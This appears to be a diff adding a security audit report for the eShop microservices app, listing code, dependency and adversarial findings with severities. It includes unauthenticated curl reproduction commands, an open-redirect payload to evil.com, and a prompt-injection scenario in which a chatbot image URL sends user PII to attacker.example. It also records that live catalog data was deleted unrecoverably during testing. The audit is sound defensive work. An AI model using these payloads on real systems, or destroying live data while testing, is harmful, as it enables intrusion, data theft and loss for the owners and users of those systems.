+  - RedirectService.ExtractRedirectUriFromReturnUrl does naive HtmlDecode + Regex.Split on 'redirect_uri='/'signin-oidc'/'scope' substrings with no allow-list or host validation. It's registered in DI (IRedirectService) via Program.cs:41 but not currently invoked by any controller/view, so it poses no live risk today. If ever wired into a redirect decision it would reintroduce an open-redirect vector; should be removed or hardened before use.
+  - Evidence/reproduction: src/Identity.API/Services/RedirectService.cs:1
+- **code-0053** [LOW] Basket keys in Redis have no TTL and no size cap, allowing unbounded growth — status: new
+  - RedisBasketRepository.UpdateBasketAsync calls _database.StringSetAsync(GetBasketKey(basket.BuyerId), json) with no expiry (src/Basket.API/Repositories/RedisBasketRepository.cs:37). Basket keys therefore persist in Redis indefinitely unless explicitly deleted via OrderStartedIntegrationEventHandler (src/Basket.API/IntegrationEvents/EventHandling/OrderStartedIntegrationEventHandler.cs:14), which only fires once an order is actually placed. Abandoned baskets, and baskets from users who never check out, live forever. There is also no cap on item count per UpdateBasket call (bounded only by the ~4MB default gRPC message size), so any authenticated caller can repeatedly grow their own basket payload. Over time this is unbounded Redis memory growth / storage-exhaustion risk rather than an acute single-request exploit.
+  - Evidence/reproduction: src/Basket.API/Repositories/RedisBasketRepository.cs:37
+
+## Dependency/CVE Review
+
+- **dep-0001** [HIGH] GHSA-v5pm-xwqc-g5wc: Microsoft.OpenApi stack-overflow via circular schema reference during parsing — status: new
+  - Microsoft.OpenApi 2.7.0 (used by eShop.ServiceDefaults, referenced by all services) is affected by a stack-overflow crash when its reader APIs parse an OpenAPI document containing a circular schema reference. Reachability check: grepped all OpenApi usage in this repo (src/eShop.ServiceDefaults/OpenApi.Extensions.cs, OpenApiOptionsExtensions.cs) — this app only uses Microsoft.OpenApi to GENERATE/serialize its own OpenAPI documents (AddOpenApi/MapOpenApi/document transformers for security schemes); it never calls the reader/parser APIs (OpenApiDocument.Load, OpenApiStringReader, etc.) on any externally-supplied document. The vulnerable code path is not reachable through this application's own usage. Patched in 2.7.5+.
+  - Evidence/reproduction: Microsoft.OpenApi@2.7.0 (GHSA-v5pm-xwqc-g5wc), used by eShop.ServiceDefaults
+  - Relevance: not-reachable
+- **dep-0002** [MEDIUM] GHSA-4625-4j76-fww9: OTLP exporter disk-retry local blob injection — status: new
+  - OpenTelemetry.Exporter.OpenTelemetryProtocol 1.15.0 (used by eShop.ServiceDefaults, referenced by all services) has a local blob-injection issue in its disk-retry feature, but only when the experimental env var OTEL_DOTNET_EXPERIMENTAL_OTLP_RETRY=disk is set without also setting OTEL_DOTNET_EXPERIMENTAL_OTLP_DISK_RETRY_DIRECTORY_PATH. Reachability check: grepped the entire repo for OTEL_DOTNET_EXPERIMENTAL_OTLP_RETRY and OTEL_DOTNET_EXPERIMENTAL_OTLP_DISK_RETRY_DIRECTORY_PATH — neither is set anywhere (not in AppHost, not in any appsettings, not in any Dockerfile-equivalent). This experimental opt-in feature is not enabled by this application. Patched in 1.15.3+.
+  - Evidence/reproduction: OpenTelemetry.Exporter.OpenTelemetryProtocol@1.15.0 (GHSA-4625-4j76-fww9), used by eShop.ServiceDefaults
+  - Relevance: not-reachable
+- **dep-0003** [MEDIUM] GHSA-mr8r-92fq-pj8p: OTLP/gRPC unbounded grpc-status-details-bin parsing (DoS) — status: new
+  - OpenTelemetry.Exporter.OpenTelemetryProtocol 1.15.0 allows a malicious/compromised OTLP collector to trigger excessive memory allocation via a crafted gRPC retry trailer. Reachability depends on trust of the configured OTLP backend, not on this app's code: src/eShop.ServiceDefaults/Extensions.cs enables the OTLP exporter whenever OTEL_EXPORTER_OTLP_ENDPOINT is set, which Aspire injects automatically to point at its local dashboard in dev (trusted, loopback-only). In a real deployment, whatever OTLP collector this env var is pointed at would need to be untrusted or MITM-able for this to be exploitable — that deployment-time configuration is outside this repo and not evaluable here. Patched in 1.15.3+.
+  - Evidence/reproduction: OpenTelemetry.Exporter.OpenTelemetryProtocol@1.15.0 (GHSA-mr8r-92fq-pj8p), used by eShop.ServiceDefaults
+  - Relevance: unknown
+- **dep-0004** [MEDIUM] GHSA-q834-8qmm-v933: OTLP exporter reads unbounded HTTP/gRPC error response bodies (DoS) — status: new
+  - OpenTelemetry.Exporter.OpenTelemetryProtocol 1.15.0 reads error response bodies from the configured OTLP backend with no upper size bound, allowing memory exhaustion if that backend is attacker-controlled or MITM'd. Same reachability reasoning as GHSA-mr8r-92fq-pj8p: in local dev the OTLP endpoint is Aspire's trusted local dashboard; production risk depends entirely on the trust/network-isolation of whatever collector OTEL_EXPORTER_OTLP_ENDPOINT is pointed at in that deployment, which is outside this repo's code. Patched in 1.15.2+.
+  - Evidence/reproduction: OpenTelemetry.Exporter.OpenTelemetryProtocol@1.15.0 (GHSA-q834-8qmm-v933), used by eShop.ServiceDefaults
+  - Relevance: unknown
+
+## Adversarial Review
+
+- **adv-0001** [CRITICAL] Catalog.API DELETE /api/catalog/items/{id} has no authorization check — status: new
+  - DELETE /api/catalog/items/{id} succeeds (204) for an unauthenticated caller with no bearer token or API key. Confirmed in source: src/Catalog.API/Apis/CatalogApi.cs:107 maps DeleteItemById with no .RequireAuthorization() and no [Authorize] attribute anywhere in the file. Any anonymous caller can permanently delete any catalog listing. During this test, the real item at id=1 was deleted this way and its original data could not be recovered.
+  - Evidence/reproduction: curl -X DELETE 'http://localhost:5222/api/catalog/items/1?api-version=1.0' with no Authorization header -> HTTP 204 (deleted). Reproduce: any unauthenticated DELETE to /api/catalog/items/{id}?api-version=1.0 against a running Catalog.API instance.
+- **adv-0002** [CRITICAL] Catalog.API POST /api/catalog/items has no authorization check — status: new
+  - POST /api/catalog/items succeeds (201) for an unauthenticated caller, allowing anyone to inject arbitrary catalog listings (name, price, stock, brand/type). Confirmed in source: src/Catalog.API/Apis/CatalogApi.cs:103 maps CreateItem with no .RequireAuthorization(). Related: PUT /api/catalog/items (line 93) and PUT /api/catalog/items/{id} (line 98) follow the identical unauthenticated-mapping pattern in the same file and were not directly exercised in this run to avoid further live-data mutation, but should be verified — same missing-authorization pattern is present in source.
+  - Evidence/reproduction: curl -X POST 'http://localhost:5222/api/catalog/items?api-version=1.0' -d '{"name":"adversarial-test-item","price":0.01,"catalogTypeId":1,"catalogBrandId":1}' with no Authorization header -> HTTP 201 (created, took id=1 after the DELETE in the sibling finding freed it). Reproduce: any unauthenticated POST to /api/catalog/items?api-version=1.0 against a running Catalog.API instance.
+  - Relevance: reachable
+
+## All Findings (grouped by severity, linked findings collapsed)
+
+### Catalog.API DELETE /api/catalog/items/{id} has no authorization check — CRITICAL
+
+- **Status**: new
+- **Detected by**: Adversarial Review
+- **[Adversarial Review] adv-0001**: DELETE /api/catalog/items/{id} succeeds (204) for an unauthenticated caller with no bearer token or API key. Confirmed in source: src/Catalog.API/Apis/CatalogApi.cs:107 maps DeleteItemById with no .RequireAuthorization() and no [Authorize] attribute anywhere in the file. Any anonymous caller can permanently delete any catalog listing. During this test, the real item at id=1 was deleted this way and its original data could not be recovered.
+  - Evidence/reproduction: curl -X DELETE 'http://localhost:5222/api/catalog/items/1?api-version=1.0' with no Authorization header -> HTTP 204 (deleted). Reproduce: any unauthenticated DELETE to /api/catalog/items/{id}?api-version=1.0 against a running Catalog.API instance.
+- **[Adversarial Review] adv-0002**: POST /api/catalog/items succeeds (201) for an unauthenticated caller, allowing anyone to inject arbitrary catalog listings (name, price, stock, brand/type). Confirmed in source: src/Catalog.API/Apis/CatalogApi.cs:103 maps CreateItem with no .RequireAuthorization(). Related: PUT /api/catalog/items (line 93) and PUT /api/catalog/items/{id} (line 98) follow the identical unauthenticated-mapping pattern in the same file and were not directly exercised in this run to avoid further live-data mutation, but should be verified — same missing-authorization pattern is present in source.
+  - Evidence/reproduction: curl -X POST 'http://localhost:5222/api/catalog/items?api-version=1.0' -d '{"name":"adversarial-test-item","price":0.01,"catalogTypeId":1,"catalogBrandId":1}' with no Authorization header -> HTTP 201 (created, took id=1 after the DELETE in the sibling finding freed it). Reproduce: any unauthenticated POST to /api/catalog/items?api-version=1.0 against a running Catalog.API instance.
+  - Relevance: reachable
+
+### SSRF protection is fully attacker-controlled and trivially bypassed (empty token + 2xx OPTIONS) — CRITICAL
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0001**: GrantUrlTesterService.TestGrantUrl only checks that request.Url and request.GrantUrl share scheme/host/port (CheckSameOrigin) - both values are attacker-supplied so this is not a real restriction (attacker sets both to e.g. http://169.254.169.254/ or http://localhost:PORT/internal). Webhooks.API then sends a live OPTIONS HTTP request from the server to that attacker-chosen URL before any success/failure decision is made (blind SSRF primitive that fires regardless of outcome). Worse, if the attacker submits an empty/omitted Token, tokenExpected becomes null, and if the target service does not return an X-eshop-whtoken response header (the overwhelming common case for internal services / cloud metadata endpoints), tokenReceived is also null, so 'tokenReceived == tokenExpected' evaluates true; combined with any 2xx response to the OPTIONS request, grantOk becomes true and the URL is persisted as a valid webhook destination with no allowlist, scheme/IP-range restriction, or DNS-rebinding protection.
+  - Evidence/reproduction: src/Webhooks.API/Services/GrantUrlTesterService.cs:5-45
+
+### Data-mutating catalog endpoints (POST/PUT/DELETE) have no authentication or authorization — CRITICAL
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0008**: None of v1.MapPut(/items, UpdateItemV1), v2.MapPut(/items/{id}, UpdateItem), api.MapPost(/items, CreateItem), or api.MapDelete(/items/{id}, DeleteItemById) call .RequireAuthorization(), and Program.cs / Extensions/Extensions.cs never call app.UseAuthentication(), app.UseAuthorization(), or builder.Services.AddDefaultAuthentication() (the helper used by sibling services Basket.API, Ordering.API, and Webhooks.API). Any unauthenticated caller with network access can create, update (including price, which fires ProductPriceChangedIntegrationEvent), or delete arbitrary catalog items.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:93-107
+
+### Path traversal / arbitrary file read via client-controlled PictureFileName — CRITICAL
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0009**: CreateItem and UpdateItem accept a client-supplied PictureFileName with no validation (no rejection of path separators, .. sequences, or rooted paths) and persist it verbatim. GetItemPictureById resolves it via GetFullPath(contentRootPath, pictureFileName) = Path.Combine(contentRootPath, "Pics", pictureFileName) and serves it with TypedResults.PhysicalFile. Because Path.Combine discards preceding segments when a later segment is a rooted path (e.g. /etc/passwd), and relative traversal sequences resolve normally through the filesystem, a caller can set PictureFileName to an absolute path or a ../ sequence and later GET /api/catalog/items/{id}/pic to read arbitrary files readable by the process (e.g. appsettings.Development.json). Combined with the missing authZ finding, this is exploitable by any unauthenticated caller.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:217,376,420-421
+
+### Cancel-order endpoint has no ownership check (IDOR) — CRITICAL
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0016**: Handle loads the order solely by command.OrderNumber via _orderRepository.GetAsync and cancels it with no check that the caller is the order's buyer. The PUT /api/orders/cancel route only requires RequireAuthorization() (any authenticated user), so any authenticated user can cancel another buyer's order by supplying its OrderNumber, since Buyer.IdentityGuid is never compared to the caller's identity.
+  - Evidence/reproduction: src/Ordering.API/Application/Commands/CancelOrderCommandHandler.cs:21
+
+### Ship-order endpoint has no ownership check (IDOR) — CRITICAL
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0017**: Same pattern as the cancel handler: the order is fetched by OrderNumber only and transitioned to Shipped with no ownership verification. Any authenticated user can force another buyer's order into Shipped status by supplying its order number.
+  - Evidence/reproduction: src/Ordering.API/Application/Commands/ShipOrderCommandHandler.cs:21
+
+### GetOrderAsync leaks any buyer's order details to any authenticated user (IDOR) — CRITICAL
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0018**: GetOrderAsync(id) returns full order details (address, items, total, status) for any order id with no filter on buyer identity, unlike GetOrdersFromUserAsync which correctly filters by o.Buyer.IdentityGuid == userId. GET /api/orders/{orderId} is gated only by RequireAuthorization(), so any authenticated user can enumerate order ids and read other customers' shipping address, items, and totals.
+  - Evidence/reproduction: src/Ordering.API/Application/Queries/OrderQueries.cs:6
+
+### Real RSA private signing key committed to source control and loaded at runtime — CRITICAL
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0021**: tempkey.jwk contains a full RSA private key (D/P/Q/DP/DQ/QI populated) tracked in git since the initial commit and copied to the build output. Program.cs calls .AddDeveloperSigningCredential() with no environment guard, so this exact checked-in key signs every access/ID token IdentityServer issues. Anyone with repo read access can forge valid JWTs for any client/scope/subject, bypassing authentication for every downstream service that trusts this IdentityServer.
+  - Evidence/reproduction: src/Identity.API/tempkey.jwk:1
+
+### Hardcoded identical client secret 'secret' for all confidential OIDC clients — CRITICAL
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0024**: Configuration/Config.cs defines the maui (line 52), webapp (line 82), and webhooksclient (line 118) clients all with ClientSecrets = { new Secret("secret".Sha256()) }. webapp/webhooksclient use RequirePkce = false, so client authentication at the token endpoint relies entirely on this shared, trivially guessable literal secret. Anyone who intercepts an authorization code can complete the code exchange and obtain tokens by impersonating the client.
+  - Evidence/reproduction: src/Identity.API/Configuration/Config.cs:52
+
+### Hardcoded default-user passwords seeded unconditionally in every environment and disclosed on login page — CRITICAL
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0034**: UsersSeed.SeedAsync creates users alice/bob with userManager.CreateAsync(user, "Pass123$") (lines 33 and 78). Program.cs:12 wires this seeder with no IsDevelopment() guard, so it runs in every environment including Production. AccountController.Login is [AllowAnonymous] with no environment check, and Views/Account/Login.cshtml:37 unconditionally renders 'The default users are alice/bob, password: Pass123$', disclosing working credentials to any anonymous visitor in any deployed environment.
+  - Evidence/reproduction: src/Identity.API/UsersSeed.cs:33
+
+### GHSA-v5pm-xwqc-g5wc: Microsoft.OpenApi stack-overflow via circular schema reference during parsing — HIGH
+
+- **Status**: new
+- **Detected by**: Dependency/CVE Review
+- **[Dependency/CVE Review] dep-0001**: Microsoft.OpenApi 2.7.0 (used by eShop.ServiceDefaults, referenced by all services) is affected by a stack-overflow crash when its reader APIs parse an OpenAPI document containing a circular schema reference. Reachability check: grepped all OpenApi usage in this repo (src/eShop.ServiceDefaults/OpenApi.Extensions.cs, OpenApiOptionsExtensions.cs) — this app only uses Microsoft.OpenApi to GENERATE/serialize its own OpenAPI documents (AddOpenApi/MapOpenApi/document transformers for security schemes); it never calls the reader/parser APIs (OpenApiDocument.Load, OpenApiStringReader, etc.) on any externally-supplied document. The vulnerable code path is not reachable through this application's own usage. Patched in 2.7.5+.
+  - Evidence/reproduction: Microsoft.OpenApi@2.7.0 (GHSA-v5pm-xwqc-g5wc), used by eShop.ServiceDefaults
+  - Relevance: not-reachable
+
+### Persistent SSRF: stored DestUrl is re-used for every future event with no re-validation or IP/host restriction — HIGH
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0002**: WebhooksSender.OnSendData builds 'RequestUri = new Uri(subs.DestUrl, UriKind.Absolute)' directly from the DB-stored DestUrl and POSTs live order/price data to it on every OrderPaid/OrderShipped/CatalogItemPriceChange event, indefinitely. There is no allowlist, no blocking of loopback/link-local/private ranges (e.g. 127.0.0.1, 169.254.169.254 cloud metadata, 10.0.0.0/8), and no re-check at delivery time - once GrantUrlTesterService approves a URL (see linked finding on how trivial that is to satisfy), that URL becomes a durable SSRF pivot that fires on every subsequent business event.
+  - Evidence/reproduction: src/Webhooks.API/Services/WebhooksSender.cs:13-33
+
+### No HMAC/signature on outgoing webhook payloads; X-eshop-whtoken is a raw shared value, not a payload signature — HIGH
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0003**: WebhooksSender.OnSendData sends the JSON body unsigned and only attaches the stored plaintext token verbatim as header 'X-eshop-whtoken' (request.Headers.Add("X-eshop-whtoken", subs.Token)). The token is not an HMAC over the payload, so it does not bind to or authenticate the body - if the body is altered/replayed by a MITM or malicious intermediary, the token header remains valid. WebhookClient's receiving endpoint mirrors this: it treats the header purely as a static bearer value ('tokenToValidate == token') rather than verifying a signature over the received bytes.
+  - Evidence/reproduction: src/Webhooks.API/Services/WebhooksSender.cs:22-25
+
+### Webhook receiver accepts unauthenticated forged payloads by default (ValidateToken defaults to false, no auth on endpoint) — HIGH
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0004**: WebhookEndpoints.MapWebhookEndpoints reads 'bool.TryParse(configuration["ValidateToken"], out var validateToken)' - if the 'ValidateToken' config key is absent (it is absent from both src/WebhookClient/appsettings.json and appsettings.Development.json), TryParse fails and validateToken defaults to false. The check 'if (!validateToken || tokenToValidate == token)' then always short-circuits true, so POST /webhook-received (and OPTIONS /check) accept and persist ANY payload from ANY caller with no authentication middleware on the endpoint (app.MapWebhookEndpoints() is not behind RequireAuthorization in Program.cs) and no default-on signature/token check. Any network-reachable client can forge an 'order paid' notification.
+  - Evidence/reproduction: src/WebhookClient/Endpoints/WebhookEndpoints.cs:10-53
+
+### PaginationRequest.PageSize/PageIndex have no bounds validation — HIGH
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0010**: PageSize and PageIndex are bound directly from query parameters with no minimum/maximum and are used as Skip(pageSize * pageIndex).Take(pageSize) in GetAllItems and GetItemsBySemanticRelevance. A client can pass a very large PageSize to force materialization of huge result sets (DoS), or pick PageSize/PageIndex values whose product overflows int32 and goes negative, producing a negative OFFSET that Npgsql/Postgres rejects, causing an unhandled exception on that request.
+  - Evidence/reproduction: src/Catalog.API/Model/PaginationRequest.cs:5-13
+
+### CreateOrder trusts client-supplied UserId instead of authenticated identity — HIGH
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0019**: CreateOrderAsync builds the CreateOrderCommand from request.UserId taken directly from the client-supplied request body, instead of the identity from IIdentityService (used correctly elsewhere). An authenticated attacker can POST a different UserId than their own token's identity, creating orders attributed to another buyer.
+  - Evidence/reproduction: src/Ordering.API/Apis/OrdersApi.cs:141
+
+### CVV/card security number logged in plaintext via structured logging — HIGH
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0020**: LoggingBehavior.Handle logs every MediatR request via {@Command} destructuring, capturing the full CreateOrderCommand including the unmasked CardSecurityNumber (CVV), CardHolderName, and CardExpiration, despite OrdersApi.cs manually masking only the card number before constructing the command.
+  - Evidence/reproduction: src/Ordering.API/Application/Behaviors/LoggingBehavior.cs:9
+
+### Authentication/authorization middleware never added to HTTP pipeline — HIGH
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0025**: Program.cs registers cookie+OIDC authentication and authorization services via AddAuthenticationServices()/AddApplicationServices() (Extensions.cs), but Program.cs never calls app.UseAuthentication() or app.UseAuthorization(). Confirmed by reading Program.cs (only UseAntiforgery, UseHttpsRedirection, UseStaticFiles, MapRazorComponents, MapForwarder are present) and eShop.ServiceDefaults/Extensions.cs MapDefaultEndpoints (only maps /health and /alive, no auth middleware). Without UseAuthentication(), HttpContext.User is not populated from the auth cookie on incoming requests, so the ServerAuthenticationStateProvider used by Blazor's CascadingAuthenticationState never sees a valid authenticated identity on subsequent requests after sign-in, undermining [Authorize] enforcement across the app.
+  - Evidence/reproduction: src/WebApp/Program.cs:12-34
+
+### Open redirect via protocol-relative returnUrl bypassing IsAbsoluteUri check — HIGH
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0028**: OnInitializedAsync builds 'var url = new Uri(returnUrl, UriKind.RelativeOrAbsolute); Nav.NavigateTo(url.IsAbsoluteUri ? "/" : returnUrl);'. A scheme-less, protocol-relative value such as returnUrl=//evil.com (or backslash variant /\evil.com which browsers normalize to //evil.com) is treated as NOT absolute by System.Uri (IsAbsoluteUri == false) because it lacks a scheme, so the raw attacker-controlled value is passed straight to NavigateTo and the browser redirects the just-authenticated user to evil.com. LogIn.Url(nav) confirms returnUrl is an attacker-controllable query parameter reachable pre-auth.
+  - Evidence/reproduction: src/WebApp/Components/Pages/User/LogIn.razor:11-17
+
+### Chatbot markdown image auto-load enables PII exfiltration (no URL allow-list, no sanitization) — HIGH
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0029**: MessageProcessor.AllowImages (MessageProcessor.cs:10-34) converts any '[text](url)' or '![text](url)' pattern found in a chat message into a live '<img src="url">' tag (regex \!?\[([^\]]+)\]\s*\(([^\)]+)\) makes the leading '!' optional, so plain markdown links are also turned into images). The captured groups are HTML-attribute-encoded (preventing attribute breakout / classic script-tag XSS) but the URL itself is never validated against a scheme/host allow-list. This is rendered via @MessageProcessor.AllowImages(message.Text) inside a MarkupString for both assistant and user messages (Chatbot.razor:24), and img tags auto-fetch as soon as they render (no click needed). Separately, ChatState.cs registers a GetUserInfo tool (ChatState.cs:96-115) that returns the user's full name, address, email and phone number as an AI-callable function result, which becomes part of the LLM conversation context. A prompt-injected or manipulated LLM response containing a markdown image whose URL query string embeds this PII (e.g. ![x](https://attacker.example/log?d=<email>)) would be auto-rendered and silently exfiltrate that data to an attacker-controlled host the instant the message displays, with no server-side or client-side sanitization step in between.
+  - Evidence/reproduction: src/WebApp/Components/Chatbot/MessageProcessor.cs:10-34
+
+### Full payment card data (including CVV) stored and issued as identity/token claims — HIGH
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0036**: ProfileService.GetClaimsFromUser (lines 70-77) adds user.CardNumber, CardHolderName, SecurityNumber (CVV), and Expiration as claims (card_number, card_holder, card_security_number, card_expiration) that flow into ID tokens/profile-scope responses for any client. ApplicationUser persists these fields directly in the Identity user table. Retaining CVV at rest and propagating PAN/CVV/expiration into OIDC claims is a PCI-DSS violation and exposes this data to every relying-party client and to any logging/tracing middleware that captures claims.
+  - Evidence/reproduction: src/Identity.API/Services/ProfileService.cs:70
+
+### GHSA-4625-4j76-fww9: OTLP exporter disk-retry local blob injection — MEDIUM
+
+- **Status**: new
+- **Detected by**: Dependency/CVE Review
+- **[Dependency/CVE Review] dep-0002**: OpenTelemetry.Exporter.OpenTelemetryProtocol 1.15.0 (used by eShop.ServiceDefaults, referenced by all services) has a local blob-injection issue in its disk-retry feature, but only when the experimental env var OTEL_DOTNET_EXPERIMENTAL_OTLP_RETRY=disk is set without also setting OTEL_DOTNET_EXPERIMENTAL_OTLP_DISK_RETRY_DIRECTORY_PATH. Reachability check: grepped the entire repo for OTEL_DOTNET_EXPERIMENTAL_OTLP_RETRY and OTEL_DOTNET_EXPERIMENTAL_OTLP_DISK_RETRY_DIRECTORY_PATH — neither is set anywhere (not in AppHost, not in any appsettings, not in any Dockerfile-equivalent). This experimental opt-in feature is not enabled by this application. Patched in 1.15.3+.
+  - Evidence/reproduction: OpenTelemetry.Exporter.OpenTelemetryProtocol@1.15.0 (GHSA-4625-4j76-fww9), used by eShop.ServiceDefaults
+  - Relevance: not-reachable
+
+### GHSA-mr8r-92fq-pj8p: OTLP/gRPC unbounded grpc-status-details-bin parsing (DoS) — MEDIUM
+
+- **Status**: new
+- **Detected by**: Dependency/CVE Review
+- **[Dependency/CVE Review] dep-0003**: OpenTelemetry.Exporter.OpenTelemetryProtocol 1.15.0 allows a malicious/compromised OTLP collector to trigger excessive memory allocation via a crafted gRPC retry trailer. Reachability depends on trust of the configured OTLP backend, not on this app's code: src/eShop.ServiceDefaults/Extensions.cs enables the OTLP exporter whenever OTEL_EXPORTER_OTLP_ENDPOINT is set, which Aspire injects automatically to point at its local dashboard in dev (trusted, loopback-only). In a real deployment, whatever OTLP collector this env var is pointed at would need to be untrusted or MITM-able for this to be exploitable — that deployment-time configuration is outside this repo and not evaluable here. Patched in 1.15.3+.
+  - Evidence/reproduction: OpenTelemetry.Exporter.OpenTelemetryProtocol@1.15.0 (GHSA-mr8r-92fq-pj8p), used by eShop.ServiceDefaults
+  - Relevance: unknown
+
+### GHSA-q834-8qmm-v933: OTLP exporter reads unbounded HTTP/gRPC error response bodies (DoS) — MEDIUM
+
+- **Status**: new
+- **Detected by**: Dependency/CVE Review
+- **[Dependency/CVE Review] dep-0004**: OpenTelemetry.Exporter.OpenTelemetryProtocol 1.15.0 reads error response bodies from the configured OTLP backend with no upper size bound, allowing memory exhaustion if that backend is attacker-controlled or MITM'd. Same reachability reasoning as GHSA-mr8r-92fq-pj8p: in local dev the OTLP endpoint is Aspire's trusted local dashboard; production risk depends entirely on the trust/network-isolation of whatever collector OTEL_EXPORTER_OTLP_ENDPOINT is pointed at in that deployment, which is outside this repo's code. Patched in 1.15.2+.
+  - Evidence/reproduction: OpenTelemetry.Exporter.OpenTelemetryProtocol@1.15.0 (GHSA-q834-8qmm-v933), used by eShop.ServiceDefaults
+  - Relevance: unknown
+
+### Unhandled exception in Task.WhenAll aborts entire webhook fan-out batch on a single failing/slow receiver — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0005**: WebhooksSender.SendAll awaits 'Task.WhenAll(tasks)' where each task is 'client.SendAsync(request)' with no try/catch and no explicit per-request timeout in OnSendData. If any one subscriber's endpoint is unreachable, slow, or errors, the resulting exception propagates out of SendAll into the IntegrationEventHandler.Handle call, which surfaces to the event bus consumer - this can cause the whole integration event (affecting all other, otherwise-successful, receivers) to be treated as failed/retried by the bus, and a single malicious or broken subscriber URL can hold up processing for up to the default HttpClient timeout (100s) with no isolation between receivers.
+  - Evidence/reproduction: src/Webhooks.API/Services/WebhooksSender.cs:5-33
+
+### Unbounded ids[] array in GetItemsByIds enables oversized query / DoS — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0011**: GetItemsByIds takes int[] ids directly from the query string with no length cap and executes Where(item => ids.Contains(item.Id)). A client can supply a very large number of ids in a single unauthenticated GET request, producing an oversized generated SQL IN-list/parameter array and consuming excess CPU/memory/DB time.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:162-168
+
+### CreateItem trusts client-supplied primary key (Id) for new catalog items — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0012**: CreateItem copies product.Id from the client request body directly into the new CatalogItem's Id with no server-side validation or override. Combined with the missing-authorization finding, any caller can create catalog rows with attacker-chosen IDs, enabling ID-squatting/collisions with future legitimate inserts or confusing other services (Ordering/Basket) that reference catalog item IDs.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:366-381
+
+### UpdateItem never reconciles route id with body productToUpdate.Id before SetValues — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0013**: UpdateItem loads the tracked entity by route id, then calls catalogEntry.CurrentValues.SetValues(productToUpdate) without checking productToUpdate.Id == id. If the client submits a body Id different from the route id (e.g. PUT /api/catalog/items/5 with body {id:6}), EF Core's primary-key handling on the tracked entity can throw an InvalidOperationException, surfacing as an unhandled 500 instead of a clean 400 validation error.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:324-341
+
+### Unvalidated CardNumber substring throws before validator runs — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0022**: request.CardNumber.Substring(request.CardNumber.Length - 4) executes before any FluentValidation validator runs. A null or short (<4 char) CardNumber throws an unhandled NullReferenceException/ArgumentOutOfRangeException, producing an unhandled 500 instead of the intended BadRequest.
+  - Evidence/reproduction: src/Ordering.API/Apis/OrdersApi.cs:140
+
+### Order totals trust client-supplied unit prices with no server-side recompute — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0023**: UnitPrice on BasketItem/OrderItemDTO is fully client-supplied and flows unchanged into Order.AddOrderItem with no recomputation against catalog pricing. A client can submit an arbitrarily low UnitPrice; only unitPrice*units >= discount is checked, so resulting order totals reflect attacker-controlled prices.
+  - Evidence/reproduction: src/Ordering.API/Application/Models/BasketItem.cs:8
+
+### Hardcoded OIDC client secret in source code — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0026**: options.ClientSecret = "secret"; is a literal hardcoded string in AddAuthenticationServices(), unlike IdentityUrl/CallBackUrl which are sourced from configuration via GetRequiredValue. Hardcoding a client secret in source means it cannot be rotated without a code change/redeploy and is exposed to anyone with source access.
+  - Evidence/reproduction: src/WebApp/Extensions/Extensions.cs:78
+
+### RequireHttpsMetadata disabled unconditionally for OIDC — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0027**: options.RequireHttpsMetadata = false; is set with no IsDevelopment() guard, so HTTPS is not required for the identity provider's discovery/metadata and token endpoints in any environment, weakening protection against MITM tampering of OIDC configuration/tokens in production.
+  - Evidence/reproduction: src/WebApp/Extensions/Extensions.cs:82
+
+### Order status transitions lack optimistic concurrency control — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0030**: SetShippedStatus, SetCancelledStatus, SetPaidStatus, etc. are check-then-act on the in-memory OrderStatus with no concurrency token configured anywhere in Ordering.Infrastructure or Ordering.Domain. Two concurrent requests transitioning order status can both pass their status guard and the later SaveChangesAsync silently overwrites the other's state instead of failing with a concurrency conflict.
+  - Evidence/reproduction: src/Ordering.Domain/AggregatesModel/OrderAggregate/Order.cs:130
+
+### Broad catch-and-swallow in IdentifiedCommandHandler hides all command failures — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0031**: The bare catch { return default; } around _mediator.Send(command, ...) swallows every exception, including legitimate domain exceptions or transient DB failures, with no logging, making real failures indistinguishable from a successful no-op.
+  - Evidence/reproduction: src/Ordering.API/Application/Commands/IdentifiedCommandHandler.cs:99
+
+### Developer signing-key credential has no production guard — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
